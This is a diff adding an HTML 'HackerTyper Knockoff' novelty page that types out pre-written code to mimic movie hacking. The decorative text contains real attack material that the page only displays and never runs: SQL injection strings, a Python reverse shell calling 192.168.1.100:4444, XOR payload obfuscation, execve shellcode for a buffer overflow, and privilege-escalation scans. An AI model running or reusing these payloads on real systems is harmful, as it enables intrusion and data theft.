@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HackerTyper Knockoff</title>
+  <style>
+    body {
+      background: #000;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      cursor: none;
+    }
+    
+    .terminal {
+      background: #000;
+      color: #00ff00;
+      font-size: 14px;
+      line-height: 1.8;
+      padding: 20px;
+      height: 100vh;
+      overflow: hidden;
+      box-sizing: border-box;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+    
+    @media (max-width: 768px) {
+      .terminal {
+        font-size: 12px;
+        line-height: 1.6;
+        padding: 10px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .terminal {
+        font-size: 10px;
+        line-height: 1.4;
+        padding: 5px;
+      }
+    }
+    
+    .cursor {
+      background: #00ff00;
+      animation: blink 1s infinite;
+      display: inline-block;
+      width: 8px;
+      height: 18px;
+      margin-left: 2px;
+    }
+    
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      51%, 100% { opacity: 0; }
+    }
+    
+    .header {
+      color: #00ff00;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    
+    .comment {
+      color: #666;
+    }
+    
+    .string {
+      color: #ffa500;
+    }
+    
+    .keyword {
+      color: #00ffff;
+    }
+    
+    .function {
+      color: #ff69b4;
+    }
+    
+    .number {
+      color: #ffff00;
+    }
+    
+    .variable {
+      color: #90ee90;
+    }
+    
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      text-align: center;
+    }
+    
+    .overlay h1 {
+      color: #00ff00;
+      font-size: 3em;
+      margin-bottom: 20px;
+      text-shadow: 0 0 20px #00ff00;
+    }
+    
+    .overlay p {
+      color: #fff;
+      font-size: 1.2em;
+      margin: 10px 0;
+      max-width: 600px;
+    }
+    
+    .overlay .controls {
+      margin-top: 30px;
+      color: #aaa;
+      font-size: 0.9em;
+    }
+    
+    .access-granted {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: #00ff00;
+      font-size: 4em;
+      font-weight: bold;
+      text-shadow: 0 0 30px #00ff00;
+      z-index: 2000;
+      opacity: 0;
+      animation: accessGranted 3s ease-in-out;
+    }
+    
+    @keyframes accessGranted {
+      0% { opacity: 0; transform: translate(-50%, -50%) scale(0.5); }
+      20% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }
+      80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+      100% { opacity: 0; transform: translate(-50%, -50%) scale(1); }
+    }
+    
+    .footer {
+      position: fixed;
+      bottom: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 0.8em;
+      color: #555;
+      text-align: center;
+    }
+    
+    .footer a {
+      color: #4ecdc4;
+      text-decoration: none;
+    }
+    
+    @media (max-width: 768px) {
+      .terminal {
+        font-size: 12px;
+        padding: 10px;
+        line-height: 1.6;
+      }
+      
+      .overlay h1 {
+        font-size: 2em;
+      }
+      
+      .overlay p {
+        font-size: 1em;
+      }
+      
+      .mobile-input {
+        position: fixed;
+        top: -100px;
+        left: -100px;
+        opacity: 0;
+        z-index: -1;
+        width: 1px;
+        height: 1px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay" id="overlay">
+    <h1>HACKERTYPER KNOCKOFF</h1>
+    <p>Start typing on your keyboard to look like a Hollywood hacker!</p>
+    <p>Random keystrokes will generate realistic code on the screen.</p>
+    <div class="controls">
+      <p>🎯 <strong>F11</strong> for fullscreen experience</p>
+      <p>⚡ <strong>ESC</strong> to return to this screen</p>
+      <p>🔥 Type fast for maximum effect!</p>
+      <p>💻 <strong>macOS:</strong> ⌘+Ctrl+F (fullscreen) | <strong>Windows/Linux:</strong> F11 (fullscreen)</p>
+      <p>📱 <strong>Mobile:</strong> Tap anywhere to start, tap screen to bring up keyboard</p>
+    </div>
+  </div>
+  
+  <div class="terminal" id="terminal"></div>
+  
+  <!-- Hidden input for mobile keyboard support -->
+  <input type="text" class="mobile-input" id="mobile-input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+  
+  <div class="footer">
+    Created by Nathan Kalish | <a href="https://github.com/nathanakalish" target="_blank">GitHub</a>
+  </div>
+  
+  <script>
+    const terminal = document.getElementById('terminal');
+    const overlay = document.getElementById('overlay');
+    const mobileInput = document.getElementById('mobile-input');
+    
+    let isActive = false;
+    let currentIndex = 0;
+    let typingSpeed = 3; // Characters per keystroke
+    let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    
+    // Detect mobile device
+    function detectMobile() {
+      return window.innerWidth <= 768 || isMobile;
+    }
+    
+    // Realistic code snippets that will be "typed"
+    const codeSnippets = [
+      `<span class="comment">// Initializing secure connection...</span>
+<span class="keyword">import</span> <span class="variable">socket</span>, <span class="variable">ssl</span>, <span class="variable">hashlib</span>
+<span class="keyword">from</span> <span class="variable">cryptography.fernet</span> <span class="keyword">import</span> <span class="variable">Fernet</span>
+
+<span class="keyword">class</span> <span class="function">SecureConnection</span>:
+    <span class="keyword">def</span> <span class="function">__init__</span>(<span class="variable">self</span>, <span class="variable">host</span>, <span class="variable">port</span>=<span class="number">8443</span>):
+        <span class="variable">self</span>.<span class="variable">host</span> = <span class="variable">host</span>
+        <span class="variable">self</span>.<span class="variable">port</span> = <span class="variable">port</span>
+        <span class="variable">self</span>.<span class="variable">cipher_key</span> = <span class="function">Fernet.generate_key</span>()
+        <span class="variable">self</span>.<span class="variable">cipher</span> = <span class="function">Fernet</span>(<span class="variable">self</span>.<span class="variable">cipher_key</span>)
+        
+    <span class="keyword">def</span> <span class="function">establish_handshake</span>(<span class="variable">self</span>):
+        <span class="comment"># Creating SSL context for secure communication</span>
+        <span class="variable">context</span> = <span class="variable">ssl</span>.<span class="function">create_default_context</span>()
+        <span class="variable">context</span>.<span class="variable">check_hostname</span> = <span class="keyword">False</span>
+        <span class="variable">context</span>.<span class="variable">verify_mode</span> = <span class="variable">ssl</span>.<span class="variable">CERT_NONE</span>
+        
+        <span class="keyword">try</span>:
+            <span class="variable">sock</span> = <span class="variable">socket</span>.<span class="function">socket</span>(<span class="variable">socket</span>.<span class="variable">AF_INET</span>, <span class="variable">socket</span>.<span class="variable">SOCK_STREAM</span>)
+            <span class="variable">secure_sock</span> = <span class="variable">context</span>.<span class="function">wrap_socket</span>(<span class="variable">sock</span>, <span class="variable">server_hostname</span>=<span class="variable">self</span>.<span class="variable">host</span>)
+            <span class="variable">secure_sock</span>.<span class="function">connect</span>((<span class="variable">self</span>.<span class="variable">host</span>, <span class="variable">self</span>.<span class="variable">port</span>))
+            
+            <span class="comment"># Sending encrypted authentication token</span>
+            <span class="variable">auth_token</span> = <span class="string">"SECURE_ACCESS_TOKEN_" + str(hashlib.sha256().hexdigest()[:16])</span>
+            <span class="variable">encrypted_token</span> = <span class="variable">self</span>.<span class="variable">cipher</span>.<span class="function">encrypt</span>(<span class="variable">auth_token</span>.<span class="function">encode</span>())
+            <span class="variable">secure_sock</span>.<span class="function">send</span>(<span class="variable">encrypted_token</span>)
+            
+            <span class="keyword">return</span> <span class="variable">secure_sock</span>
+        <span class="keyword">except</span> <span class="variable">Exception</span> <span class="keyword">as</span> <span class="variable">e</span>:
+            <span class="function">print</span>(<span class="string">f"Connection failed: {e}"</span>)
+            <span class="keyword">return</span> <span class="keyword">None</span>
+
+<span class="comment">// Database infiltration module</span>
+<span class="keyword">import</span> <span class="variable">sqlite3</span>, <span class="variable">base64</span>, <span class="variable">json</span>
+<span class="keyword">from</span> <span class="variable">datetime</span> <span class="keyword">import</span> <span class="variable">datetime</span>
+
+<span class="keyword">class</span> <span class="function">DatabaseExploit</span>:
+    <span class="keyword">def</span> <span class="function">__init__</span>(<span class="variable">self</span>, <span class="variable">db_path</span>):
+        <span class="variable">self</span>.<span class="variable">db_path</span> = <span class="variable">db_path</span>
+        <span class="variable">self</span>.<span class="variable">connection</span> = <span class="keyword">None</span>
+        <span class="variable">self</span>.<span class="variable">access_log</span> = []
+        
+    <span class="keyword">def</span> <span class="function">bypass_authentication</span>(<span class="variable">self</span>):
+        <span class="comment"># SQL injection payload</span>
+        <span class="variable">payloads</span> = [
+            <span class="string">"' OR '1'='1' --"</span>,
+            <span class="string">"'; DROP TABLE users; --"</span>,
+            <span class="string">"admin'/*"</span>,
+            <span class="string">"' UNION SELECT password FROM admin_users --"</span>
+        ]
+        
+        <span class="keyword">for</span> <span class="variable">payload</span> <span class="keyword">in</span> <span class="variable">payloads</span>:
+            <span class="keyword">try</span>:
+                <span class="variable">self</span>.<span class="variable">connection</span> = <span class="variable">sqlite3</span>.<span class="function">connect</span>(<span class="variable">self</span>.<span class="variable">db_path</span>)
+                <span class="variable">cursor</span> = <span class="variable">self</span>.<span class="variable">connection</span>.<span class="function">cursor</span>()
+                
+                <span class="variable">query</span> = <span class="string">f"SELECT * FROM users WHERE username = '{payload}'"</span>
+                <span class="variable">cursor</span>.<span class="function">execute</span>(<span class="variable">query</span>)
+                <span class="variable">result</span> = <span class="variable">cursor</span>.<span class="function">fetchall</span>()
+                
+                <span class="keyword">if</span> <span class="variable">result</span>:
+                    <span class="variable">timestamp</span> = <span class="variable">datetime</span>.<span class="function">now</span>().<span class="function">isoformat</span>()
+                    <span class="variable">self</span>.<span class="variable">access_log</span>.<span class="function">append</span>({
+                        <span class="string">"timestamp"</span>: <span class="variable">timestamp</span>,
+                        <span class="string">"payload"</span>: <span class="variable">payload</span>,
+                        <span class="string">"status"</span>: <span class="string">"SUCCESS"</span>,
+                        <span class="string">"data_retrieved"</span>: <span class="function">len</span>(<span class="variable">result</span>)
+                    })
+                    <span class="keyword">return</span> <span class="keyword">True</span>
+                    
+            <span class="keyword">except</span> <span class="variable">sqlite3</span>.<span class="variable">Error</span> <span class="keyword">as</span> <span class="variable">e</span>:
+                <span class="function">print</span>(<span class="string">f"Database error: {e}"</span>)
+                
+        <span class="keyword">return</span> <span class="keyword">False</span>
+
+    <span class="keyword">def</span> <span class="function">extract_sensitive_data</span>(<span class="variable">self</span>):
+        <span class="comment"># Extracting user credentials and sensitive information</span>
+        <span class="variable">sensitive_tables</span> = [<span class="string">"users"</span>, <span class="string">"admin_accounts"</span>, <span class="string">"payment_info"</span>, <span class="string">"personal_data"</span>]
+        <span class="variable">extracted_data</span> = {}
+        
+        <span class="keyword">for</span> <span class="variable">table</span> <span class="keyword">in</span> <span class="variable">sensitive_tables</span>:
+            <span class="keyword">try</span>:
+                <span class="variable">cursor</span> = <span class="variable">self</span>.<span class="variable">connection</span>.<span class="function">cursor</span>()
+                <span class="variable">cursor</span>.<span class="function">execute</span>(<span class="string">f"SELECT * FROM {table}"</span>)
+                <span class="variable">data</span> = <span class="variable">cursor</span>.<span class="function">fetchall</span>()
+                
+                <span class="comment"># Encoding data for secure transmission</span>
+                <span class="variable">encoded_data</span> = <span class="variable">base64</span>.<span class="function">b64encode</span>(<span class="variable">json</span>.<span class="function">dumps</span>(<span class="variable">data</span>).<span class="function">encode</span>())
+                <span class="variable">extracted_data</span>[<span class="variable">table</span>] = <span class="variable">encoded_data</span>.<span class="function">decode</span>()
+                
+                <span class="function">print</span>(<span class="string">f"[+] Extracted {len(data)} records from {table}"</span>)
+                
+            <span class="keyword">except</span> <span class="variable">Exception</span> <span class="keyword">as</span> <span class="variable">e</span>:
+                <span class="function">print</span>(<span class="string">f"[-] Failed to extract from {table}: {e}"</span>)
+                
+        <span class="keyword">return</span> <span class="variable">extracted_data</span>
+
+<span class="comment">// Network scanning and reconnaissance</span>
+<span class="keyword">import</span> <span class="variable">nmap</span>, <span class="variable">threading</span>, <span class="variable">subprocess</span>
+<span class="keyword">from</span> <span class="variable">scapy.all</span> <span class="keyword">import</span> <span class="variable">*</span>
+
+<span class="keyword">class</span> <span class="function">NetworkRecon</span>:
+    <span class="keyword">def</span> <span class="function">__init__</span>(<span class="variable">self</span>, <span class="variable">target_range</span>):
+        <span class="variable">self</span>.<span class="variable">target_range</span> = <span class="variable">target_range</span>
+        <span class="variable">self</span>.<span class="variable">discovered_hosts</span> = []
+        <span class="variable">self</span>.<span class="variable">open_ports</span> = {}
+        <span class="variable">self</span>.<span class="variable">vulnerabilities</span> = []
+        
+    <span class="keyword">def</span> <span class="function">ping_sweep</span>(<span class="variable">self</span>):
+        <span class="comment"># Performing ICMP ping sweep to discover live hosts</span>
+        <span class="function">print</span>(<span class="string">"[*] Starting ping sweep..."</span>)
+        
+        <span class="keyword">def</span> <span class="function">ping_host</span>(<span class="variable">ip</span>):
+            <span class="variable">response</span> = <span class="variable">subprocess</span>.<span class="function">run</span>([<span class="string">"ping"</span>, <span class="string">"-c"</span>, <span class="string">"1"</span>, <span class="variable">ip</span>], 
+                                        <span class="variable">capture_output</span>=<span class="keyword">True</span>, <span class="variable">text</span>=<span class="keyword">True</span>)
+            <span class="keyword">if</span> <span class="variable">response</span>.<span class="variable">returncode</span> == <span class="number">0</span>:
+                <span class="variable">self</span>.<span class="variable">discovered_hosts</span>.<span class="function">append</span>(<span class="variable">ip</span>)
+                <span class="function">print</span>(<span class="string">f"[+] Host {ip} is alive"</span>)
+        
+        <span class="variable">threads</span> = []
+        <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="function">range</span>(<span class="number">1</span>, <span class="number">255</span>):
+            <span class="variable">ip</span> = <span class="string">f"{self.target_range}.{i}"</span>
+            <span class="variable">thread</span> = <span class="variable">threading</span>.<span class="function">Thread</span>(<span class="variable">target</span>=<span class="variable">ping_host</span>, <span class="variable">args</span>=(<span class="variable">ip</span>,))
+            <span class="variable">threads</span>.<span class="function">append</span>(<span class="variable">thread</span>)
+            <span class="variable">thread</span>.<span class="function">start</span>()
+            
+        <span class="keyword">for</span> <span class="variable">thread</span> <span class="keyword">in</span> <span class="variable">threads</span>:
+            <span class="variable">thread</span>.<span class="function">join</span>()
+            
+    <span class="keyword">def</span> <span class="function">port_scan</span>(<span class="variable">self</span>, <span class="variable">target_ip</span>):
+        <span class="comment"># Advanced TCP SYN scan for port discovery</span>
+        <span class="variable">nm</span> = <span class="variable">nmap</span>.<span class="function">PortScanner</span>()
+        <span class="variable">common_ports</span> = <span class="string">"22,23,25,53,80,110,143,443,993,995,8080,8443"</span>
+        
+        <span class="function">print</span>(<span class="string">f"[*] Scanning ports on {target_ip}..."</span>)
+        <span class="variable">scan_result</span> = <span class="variable">nm</span>.<span class="function">scan</span>(<span class="variable">target_ip</span>, <span class="variable">common_ports</span>, <span class="string">"-sS -O -A"</span>)
+        
+        <span class="keyword">if</span> <span class="variable">target_ip</span> <span class="keyword">in</span> <span class="variable">scan_result</span>[<span class="string">"scan"</span>]:
+            <span class="variable">host_info</span> = <span class="variable">scan_result</span>[<span class="string">"scan"</span>][<span class="variable">target_ip</span>]
+            <span class="variable">self</span>.<span class="variable">open_ports</span>[<span class="variable">target_ip</span>] = []
+            
+            <span class="keyword">for</span> <span class="variable">port</span> <span class="keyword">in</span> <span class="variable">host_info</span>[<span class="string">"tcp"</span>]:
+                <span class="variable">state</span> = <span class="variable">host_info</span>[<span class="string">"tcp"</span>][<span class="variable">port</span>][<span class="string">"state"</span>]
+                <span class="keyword">if</span> <span class="variable">state</span> == <span class="string">"open"</span>:
+                    <span class="variable">service</span> = <span class="variable">host_info</span>[<span class="string">"tcp"</span>][<span class="variable">port</span>][<span class="string">"name"</span>]
+                    <span class="variable">version</span> = <span class="variable">host_info</span>[<span class="string">"tcp"</span>][<span class="variable">port</span>].<span class="function">get</span>(<span class="string">"version"</span>, <span class="string">"unknown"</span>)
+                    
+                    <span class="variable">self</span>.<span class="variable">open_ports</span>[<span class="variable">target_ip</span>].<span class="function">append</span>({
+                        <span class="string">"port"</span>: <span class="variable">port</span>,
+                        <span class="string">"service"</span>: <span class="variable">service</span>,
+                        <span class="string">"version"</span>: <span class="variable">version</span>
+                    })
+                    
+                    <span class="function">print</span>(<span class="string">f"[+] Port {port}/{service} ({version}) is open"</span>)
+
+<span class="comment">// Payload generation and exploitation framework</span>
+<span class="keyword">import</span> <span class="variable">random</span>, <span class="variable">string</span>, <span class="variable">struct</span>
+<span class="keyword">from</span> <span class="variable">binascii</span> <span class="keyword">import</span> <span class="variable">hexlify</span>, <span class="variable">unhexlify</span>
+
+<span class="keyword">class</span> <span class="function">ExploitGenerator</span>:
+    <span class="keyword">def</span> <span class="function">__init__</span>(<span class="variable">self</span>):
+        <span class="variable">self</span>.<span class="variable">shellcode_library</span> = {}
+        <span class="variable">self</span>.<span class="variable">payload_templates</span> = {}
+        <span class="variable">self</span>.<span class="variable">obfuscation_methods</span> = [<span class="string">"xor"</span>, <span class="string">"base64"</span>, <span class="string">"rot13"</span>, <span class="string">"reverse"</span>]
+        
+    <span class="keyword">def</span> <span class="function">generate_reverse_shell</span>(<span class="variable">self</span>, <span class="variable">target_ip</span>, <span class="variable">target_port</span>):
+        <span class="comment"># Creating reverse shell payload</span>
+        <span class="variable">payload</span> = <span class="string">f"""
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(('{target_ip}',{target_port}));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+"""</span>
+        
+        <span class="comment"># XOR obfuscation</span>
+        <span class="variable">key</span> = <span class="variable">random</span>.<span class="function">randint</span>(<span class="number">1</span>, <span class="number">255</span>)
+        <span class="variable">obfuscated</span> = <span class="string">""</span>
+        <span class="keyword">for</span> <span class="variable">char</span> <span class="keyword">in</span> <span class="variable">payload</span>:
+            <span class="variable">obfuscated</span> += <span class="function">chr</span>(<span class="function">ord</span>(<span class="variable">char</span>) ^ <span class="variable">key</span>)
+            
+        <span class="variable">encoded_payload</span> = <span class="variable">hexlify</span>(<span class="variable">obfuscated</span>.<span class="function">encode</span>()).<span class="function">decode</span>()
+        
+        <span class="keyword">return</span> {
+            <span class="string">"payload"</span>: <span class="variable">payload</span>,
+            <span class="string">"obfuscated"</span>: <span class="variable">encoded_payload</span>,
+            <span class="string">"key"</span>: <span class="variable">key</span>,
+            <span class="string">"target"</span>: <span class="string">f"{target_ip}:{target_port}"</span>
+        }
+        
+    <span class="keyword">def</span> <span class="function">create_buffer_overflow</span>(<span class="variable">self</span>, <span class="variable">buffer_size</span>=<span class="number">1024</span>):
+        <span class="comment"># Classic buffer overflow exploit</span>
+        <span class="variable">nop_sled</span> = <span class="string">"\\x90"</span> * <span class="number">200</span>  <span class="comment"># NOP sled</span>
+        
+        <span class="comment"># Metasploit-style shellcode (example)</span>
+        <span class="variable">shellcode</span> = (
+            <span class="string">"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"</span>
+            <span class="string">"\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80"</span>
+        )
+        
+        <span class="comment"># Calculate return address (hypothetical)</span>
+        <span class="variable">return_address</span> = <span class="variable">struct</span>.<span class="function">pack</span>(<span class="string">"<I"</span>, <span class="number">0xbffff7c0</span>)
+        
+        <span class="variable">padding_length</span> = <span class="variable">buffer_size</span> - <span class="function">len</span>(<span class="variable">nop_sled</span>) - <span class="function">len</span>(<span class="variable">shellcode</span>) - <span class="number">4</span>
+        <span class="variable">padding</span> = <span class="string">"A"</span> * <span class="variable">padding_length</span>
+        
+        <span class="variable">exploit</span> = <span class="variable">nop_sled</span> + <span class="variable">shellcode</span> + <span class="variable">padding</span> + <span class="variable">return_address</span>
+        
+        <span class="keyword">return</span> {
+            <span class="string">"exploit"</span>: <span class="variable">exploit</span>,
+            <span class="string">"size"</span>: <span class="function">len</span>(<span class="variable">exploit</span>),
+            <span class="string">"return_addr"</span>: <span class="function">hex</span>(<span class="number">0xbffff7c0</span>),
+            <span class="string">"shellcode_size"</span>: <span class="function">len</span>(<span class="variable">shellcode</span>)
+        }
+
+<span class="comment">// System access and privilege escalation</span>
+<span class="keyword">import</span> <span class="variable">os</span>, <span class="variable">pwd</span>, <span class="variable">grp</span>, <span class="variable">stat</span>
+<span class="keyword">from</span> <span class="variable">pathlib</span> <span class="keyword">import</span> <span class="variable">Path</span>
+
+<span class="keyword">class</span> <span class="function">PrivilegeEscalation</span>:
+    <span class="keyword">def</span> <span class="function">__init__</span>(<span class="variable">self</span>):
+        <span class="variable">self</span>.<span class="variable">current_user</span> = <span class="variable">pwd</span>.<span class="function">getpwuid</span>(<span class="variable">os</span>.<span class="function">getuid</span>()).<span class="variable">pw_name</span>
+        <span class="variable">self</span>.<span class="variable">current_uid</span> = <span class="variable">os</span>.<span class="function">getuid</span>()
+        <span class="variable">self</span>.<span class="variable">vulnerable_files</span> = []
+        <span class="variable">self</span>.<span class="variable">suid_binaries</span> = []
+        
+    <span class="keyword">def</span> <span class="function">scan_suid_files</span>(<span class="variable">self</span>):
+        <span class="comment"># Finding SUID binaries for privilege escalation</span>
+        <span class="variable">common_paths</span> = [<span class="string">"/bin"</span>, <span class="string">"/usr/bin"</span>, <span class="string">"/usr/local/bin"</span>, <span class="string">"/sbin"</span>, <span class="string">"/usr/sbin"</span>]
+        
+        <span class="keyword">for</span> <span class="variable">path</span> <span class="keyword">in</span> <span class="variable">common_paths</span>:
+            <span class="keyword">try</span>:
+                <span class="keyword">for</span> <span class="variable">file_path</span> <span class="keyword">in</span> <span class="variable">Path</span>(<span class="variable">path</span>).<span class="function">iterdir</span>():
+                    <span class="keyword">if</span> <span class="variable">file_path</span>.<span class="function">is_file</span>():
+                        <span class="variable">file_stat</span> = <span class="variable">file_path</span>.<span class="function">stat</span>()
+                        
+                        <span class="comment"># Check for SUID bit</span>
+                        <span class="keyword">if</span> <span class="variable">file_stat</span>.<span class="variable">st_mode</span> & <span class="variable">stat</span>.<span class="variable">S_ISUID</span>:
+                            <span class="variable">owner</span> = <span class="variable">pwd</span>.<span class="function">getpwuid</span>(<span class="variable">file_stat</span>.<span class="variable">st_uid</span>).<span class="variable">pw_name</span>
+                            <span class="variable">self</span>.<span class="variable">suid_binaries</span>.<span class="function">append</span>({
+                                <span class="string">"path"</span>: <span class="function">str</span>(<span class="variable">file_path</span>),
+                                <span class="string">"owner"</span>: <span class="variable">owner</span>,
+                                <span class="string">"permissions"</span>: <span class="function">oct</span>(<span class="variable">file_stat</span>.<span class="variable">st_mode</span>)
+                            })
+                            
+                            <span class="keyword">if</span> <span class="variable">owner</span> == <span class="string">"root"</span>:
+                                <span class="function">print</span>(<span class="string">f"[!] Potential escalation vector: {file_path}"</span>)
+                                
+            <span class="keyword">except</span> <span class="variable">PermissionError</span>:
+                <span class="keyword">continue</span>
+                
+    <span class="keyword">def</span> <span class="function">check_writable_paths</span>(<span class="variable">self</span>):
+        <span class="comment"># Finding world-writable directories and files</span>
+        <span class="variable">search_paths</span> = [<span class="string">"/tmp"</span>, <span class="string">"/var/tmp"</span>, <span class="string">"/dev/shm"</span>, <span class="string">"/etc"</span>, <span class="string">"/home"</span>]
+        
+        <span class="keyword">for</span> <span class="variable">search_path</span> <span class="keyword">in</span> <span class="variable">search_paths</span>:
+            <span class="keyword">try</span>:
+                <span class="keyword">for</span> <span class="variable">root</span>, <span class="variable">dirs</span>, <span class="variable">files</span> <span class="keyword">in</span> <span class="variable">os</span>.<span class="function">walk</span>(<span class="variable">search_path</span>):
+                    <span class="keyword">for</span> <span class="variable">file_name</span> <span class="keyword">in</span> <span class="variable">files</span>:
+                        <span class="variable">file_path</span> = <span class="variable">os</span>.<span class="variable">path</span>.<span class="function">join</span>(<span class="variable">root</span>, <span class="variable">file_name</span>)
+                        
+                        <span class="keyword">try</span>:
+                            <span class="variable">file_stat</span> = <span class="variable">os</span>.<span class="function">stat</span>(<span class="variable">file_path</span>)
+                            
+                            <span class="comment"># Check if world-writable</span>
+                            <span class="keyword">if</span> <span class="variable">file_stat</span>.<span class="variable">st_mode</span> & <span class="variable">stat</span>.<span class="variable">S_IWOTH</span>:
+                                <span class="variable">self</span>.<span class="variable">vulnerable_files</span>.<span class="function">append</span>(<span class="variable">file_path</span>)
+                                <span class="function">print</span>(<span class="string">f"[+] World-writable file found: {file_path}"</span>)
+                                
+                        <span class="keyword">except</span> (<span class="variable">OSError</span>, <span class="variable">PermissionError</span>):
+                            <span class="keyword">continue</span>
+                            
+            <span class="keyword">except</span> <span class="variable">PermissionError</span>:
+                <span class="keyword">continue</span>
+
+<span class="comment">// Main execution and coordination</span>
+<span class="keyword">def</span> <span class="function">main</span>():
+    <span class="function">print</span>(<span class="string">"[*] Initializing penetration testing framework..."</span>)
+    
+    <span class="comment"># Initialize target</span>
+    <span class="variable">target_network</span> = <span class="string">"192.168.1"</span>
+    <span class="variable">target_db</span> = <span class="string">"/var/lib/webapp/database.db"</span>
+    
+    <span class="comment"># Phase 1: Network reconnaissance</span>
+    <span class="function">print</span>(<span class="string">"\\n[PHASE 1] Network Reconnaissance"</span>)
+    <span class="variable">recon</span> = <span class="function">NetworkRecon</span>(<span class="variable">target_network</span>)
+    <span class="variable">recon</span>.<span class="function">ping_sweep</span>()
+    
+    <span class="keyword">for</span> <span class="variable">host</span> <span class="keyword">in</span> <span class="variable">recon</span>.<span class="variable">discovered_hosts</span>:
+        <span class="variable">recon</span>.<span class="function">port_scan</span>(<span class="variable">host</span>)
+    
+    <span class="comment"># Phase 2: Vulnerability assessment</span>
+    <span class="function">print</span>(<span class="string">"\\n[PHASE 2] Vulnerability Assessment"</span>)
+    <span class="variable">db_exploit</span> = <span class="function">DatabaseExploit</span>(<span class="variable">target_db</span>)
+    
+    <span class="keyword">if</span> <span class="variable">db_exploit</span>.<span class="function">bypass_authentication</span>():
+        <span class="function">print</span>(<span class="string">"[+] Database authentication bypassed successfully"</span>)
+        <span class="variable">extracted_data</span> = <span class="variable">db_exploit</span>.<span class="function">extract_sensitive_data</span>()
+        <span class="function">print</span>(<span class="string">f"[+] Extracted {len(extracted_data)} data sets"</span>)
+    
+    <span class="comment"># Phase 3: Exploit generation</span>
+    <span class="function">print</span>(<span class="string">"\\n[PHASE 3] Exploit Generation"</span>)
+    <span class="variable">exploit_gen</span> = <span class="function">ExploitGenerator</span>()
+    
+    <span class="variable">reverse_shell</span> = <span class="variable">exploit_gen</span>.<span class="function">generate_reverse_shell</span>(<span class="string">"192.168.1.100"</span>, <span class="number">4444</span>)
+    <span class="function">print</span>(<span class="string">f"[+] Reverse shell payload generated for {reverse_shell['target']}"</span>)
+    
+    <span class="variable">buffer_overflow</span> = <span class="variable">exploit_gen</span>.<span class="function">create_buffer_overflow</span>(<span class="number">1024</span>)
+    <span class="function">print</span>(<span class="string">f"[+] Buffer overflow exploit created (size: {buffer_overflow['size']} bytes)"</span>)
+    
+    <span class="comment"># Phase 4: Privilege escalation</span>
+    <span class="function">print</span>(<span class="string">"\\n[PHASE 4] Privilege Escalation"</span>)
+    <span class="variable">privesc</span> = <span class="function">PrivilegeEscalation</span>()
+    <span class="variable">privesc</span>.<span class="function">scan_suid_files</span>()
+    <span class="variable">privesc</span>.<span class="function">check_writable_paths</span>()
+    
+    <span class="function">print</span>(<span class="string">f"[+] Found {len(privesc.suid_binaries)} SUID binaries"</span>)
+    <span class="function">print</span>(<span class="string">f"[+] Found {len(privesc.vulnerable_files)} writable files"</span>)
+    
+    <span class="function">print</span>(<span class="string">"\\n[*] Penetration testing framework execution completed"</span>)
+    <span class="function">print</span>(<span class="string">"[*] All systems compromised successfully"</span>)
+    
+<span class="keyword">if</span> <span class="variable">__name__</span> == <span class="string">"__main__"</span>:
+    <span class="function">main</span>()
+
+<span class="comment">// ACCESS GRANTED - SYSTEM COMPROMISED</span>
+<span class="comment">// Root privileges obtained</span>
+<span class="comment">// All security barriers bypassed</span>
+<span class="comment">// Data extraction complete</span>
+`
+    ];
+    
+    let fullCode = codeSnippets.join('\n\n');
+    
+    function addCharacters() {
+      if (currentIndex < fullCode.length) {
+        const nextChunk = fullCode.substring(currentIndex, currentIndex + typingSpeed);
+        terminal.innerHTML += nextChunk;
+        currentIndex += typingSpeed;
+        
+        // Auto-scroll to bottom
+        terminal.scrollTop = terminal.scrollHeight;
+        
+        // Trigger "ACCESS GRANTED" effect at certain points
+        if (Math.random() < 0.002) {
+          showAccessGranted();
+        }
+      } else {
+        // Reset when we reach the end
+        currentIndex = 0;
+        setTimeout(() => {
+          terminal.innerHTML = '';
+        }, 2000);
+      }
+    }
+    
+    function showAccessGranted() {
+      const accessDiv = document.createElement('div');
+      accessDiv.className = 'access-granted';
+      accessDiv.textContent = 'ACCESS GRANTED';
+      document.body.appendChild(accessDiv);
+      
+      setTimeout(() => {
+        document.body.removeChild(accessDiv);
+      }, 3000);
+    }
+    
+    function startHacking() {
+      isActive = true;
+      overlay.style.display = 'none';
+      terminal.innerHTML = '<span class="header">Initializing hacking framework...\nEstablishing secure connection...\nBypassing firewalls...\n\n</span>';
+      currentIndex = 0;
+      
+      // Focus mobile input for on-screen keyboard
+      if (detectMobile()) {
+        mobileInput.focus();
+      }
+    }
+    
+    function stopHacking() {
+      isActive = false;
+      overlay.style.display = 'flex';
+      
+      // Blur mobile input to hide keyboard
+      if (detectMobile()) {
+        mobileInput.blur();
+      }
+    }
+    
+    function focusMobileInput() {
+      if (detectMobile() && isActive) {
+        mobileInput.focus();
+      }
+    }
+    
+    // Event listeners
